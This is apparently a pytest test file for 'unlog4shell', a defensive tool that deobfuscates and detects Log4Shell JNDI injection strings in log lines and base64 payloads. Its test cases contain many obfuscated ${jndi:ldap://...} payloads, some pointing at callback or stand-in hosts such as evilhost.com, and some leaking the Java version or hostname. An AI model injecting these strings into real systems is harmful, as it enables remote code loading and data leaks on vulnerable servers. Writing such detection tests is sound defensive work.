import pytest

from unlog4shell import check_payload, check_string, deobfuscate


@pytest.mark.parametrize(
    "encoded, decoded",
    [
        #('${jndi:ldap://127.0.0.1:1664/${sys:java.runtime.version}}', 'ldap://127.0.0.1:1664/${sys:java.runtime.version}'),
        ('${::-x}', 'x'),
        ('${abc:def:-x}', 'x'),
        ('${abcd:e:fghi:-x}', 'x'),  # Don't think this is valid, but I've seen examples
        ('${lower:XYZ}', 'xyz'),
    ]
)
def test_deobfuscate(encoded, decoded):
    assert deobfuscate(encoded) == decoded


@pytest.mark.parametrize(
    "encoded, decoded",
    [
        ('${jNdi:${lower:L}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}',
         'ldap://world80.log4j.binaryedge.io:80/callback'),
        # This one doesn't preserve ${hostname} so there's room for improvement
        #('${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6srgca885rp3faud8egcgh5u8oyyti3q.interact.sh}',
        # 'ldap://${hostname}.c6srgca885rp3faud8egcgh5u8oyyti3q.interact.sh'),  # TODO: should we preserve case in ${hostName}?
        ('${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}',
         'ldap://example.com'),
        ('Dec 15 12:28:55 127.0.0.1 [qw_4:078ef1bc-1d0b-4e67-8223-75bee730368c] com.q1labs.core.shared.ariel.CustomKeyCreator: [WARN] [NOT:0000004000][172.31.79.90/- -] [-/- -]keyFromString failed. Expression for property Sender Host tried to return ${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback} as class com.q1labs.core.dao.util.Host. Check the custom property definition to ensure it is the proper type.\n',
         'ldap://xf.world80.log4j.binaryedge.io:80/callback'),
        ('${jndi:ldap://127.0.0.1#evilhost.com:1389/a}',
         'ldap://127.0.0.1#evilhost.com:1389/a'),
        ('/foo?query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}',
         'ldap://example.com'),
        ('${${::-${::-${::-j}}}ndi:ldap://example.com}',
         'ldap://example.com'),
        ('${${::-${::-$${::-j}}}ndi:ldap://example.com}',
         'ldap://example.com'),
    ]
)
def test_strings(encoded, decoded):
    assert check_string(encoded) == decoded


@pytest.mark.parametrize(
    "encoded, decoded",
    [
        ('RGVjIDE1IDEyOjI4OjU1IDEyNy4wLjAuMSAgW3F3XzQ6MDc4ZWYxYmMtMWQwYi00ZTY3LTgyMjMtNzViZWU3MzAzNjhjXSBjb20ucTFsYWJzLmNvcmUuc2hhcmVkLmFyaWVsLkN1c3RvbUtleUNyZWF0b3I6IFtXQVJOXSBbTk9UOjAwMDAwMDQwMDBdWzE3Mi4zMS43OS45MC8tIC1dIFstLy0gLV1rZXlGcm9tU3RyaW5nIGZhaWxlZC4gRXhwcmVzc2lvbiBmb3IgcHJvcGVydHkgU2VuZGVyIEhvc3QgdHJpZWQgdG8gcmV0dXJuICR7am5kaToke2xvd2VyOmx9JHtsb3dlcjpkfWEke2xvd2VyOnB9Oi8veGYud29ybGQ4MC5sb2c0ai5iaW4ke3VwcGVyOmF9cnllZGdlLmlvOjgwL2NhbGxiYWNrfSBhcyBjbGFzcyBjb20ucTFsYWJzLmNvcmUuZGFvLnV0aWwuSG9zdC4gQ2hlY2sgdGhlIGN1c3RvbSBwcm9wZXJ0eSBkZWZpbml0aW9uIHRvIGVuc3VyZSBpdCBpcyB0aGUgcHJvcGVyIHR5cGUuCg==',
         'ldap://xf.world80.log4j.binaryedge.io:80/callback'),
    ]
)
def test_payloads(encoded, decoded):
    assert check_payload(encoded) == decoded
    

@pytest.mark.parametrize(
    "payload",
    [
        ('jndi:ldap://example.com'),  # Negative since it's not ${...}
        ('{"foo":"bar"}'),
        ('"foo":"bar"}'),
        ('{"foo":"bar"'),
        ('${broken:thing'),
        ('#!/bin/bash\n\nsomething=${MYVAR:-default}\n'),
        ('Dec 16 19:52:49 li-840c4dcf-0d4b-42ca-9a7e-2603c1ad2626 systemd[1]: fprintd.service: Succeeded.'),
        ('${${nCdl:xlKziH:B:HfDmcQ:-j}${BYkus:XmUteQ:-n}${gN:NI:-d}${sLUUc:fh:eIw:-i}${XWAhx:gtd:-:}'),  # Incomplete
        ('${${::-${::-$${::-j}}}}'),  # Not log4shell, though apparently can cause DoS?
    ]
)
def test_negaives(payload):
    # Mostly just make sure the parser doesn't blow up
    assert check_string(payload) is None


# Nasty example from https://github.com/woodpecker-appstore/log4j-payload-generator
def test_all_obfuscations():
    s = '${${nCdl:xlKziH:B:HfDmcQ:-j}${BYkus:XmUteQ:-n}${gN:NI:-d}${sLUUc:fh:eIw:-i}${XWAhx:gtd:-:}${sqf:-l}${tgyMAW:YoRmXr:LMC:QvG:-d}${B:DUPb:oSgUuo:xQz:gnYNX:-a}${YSJj:n:axeC:-p}${ylanor:VdRoFV:-:}${hu:eM:GKLG:XHOX:G:-/}${ks:PMA:LE:YUmi:LVrcMe:-/}${qVmdFK:-1}${GjiHeL:ERaPpC:CGNApg:-2}${MVU:-7}${IUEN:FM:G:Acq:-.}${WCYvc:-0}${dW:m:qtqMg:k:-.}${eS:-0}${qaTNqU:afnqb:RsE:P:Wag:-.}${Kqsld:-1}${Yh:-:}${Pd:vkyJfY:-1}${m:GO:-6}${twU:w:fMJFW:qb:JqSFP:-6}${mgUuFB:E:C:mJXbp:-4}${iVvv:cjOHtL:wo:IYkv:mMLV:-/}${${hWafTL:TR:GKneYS:-s}${LGL:Upqn:F:-y}${JOOU:LMQIPH:-s}${UYrvc:nv:0iQFc:G:-:}${LRaJh:zyD:-j}${G:a:po:if:-a}${yWTyt:Cbzj:eKui:-v}${f:yHA:k:-a}${tel:x:bki:-.}${bdE:DsswVr:-r}${iqoNvo:liis:-u}${VUSSL:nvFK:GqDir:-n}${x:eaYvi:J:FfAVgo:-t}${s:-i}${Wv:r:CH:-m}${RWIHGN:f:m:EBd:-e}${L:FxgFA:-.}${FFTDAY:GhA:-v}${LZKAHu:jkaEjK:fJ:-e}${pJoXcy:-r}${VVZS:VMDP:hBI:czXSu:JM:-s}${WFHCr:EyBTW:dHYnWi:FJA:-i}${o:LqDYN:EGYAGO:ApPu:JH:-o}${YLO:-n}}}'
    #assert check_string(s) == 'ldap://127.0.0.1:1664/${sys:java.runtime.version}'
    assert check_string(s) == 'ldap://127.0.0.1:1664/'
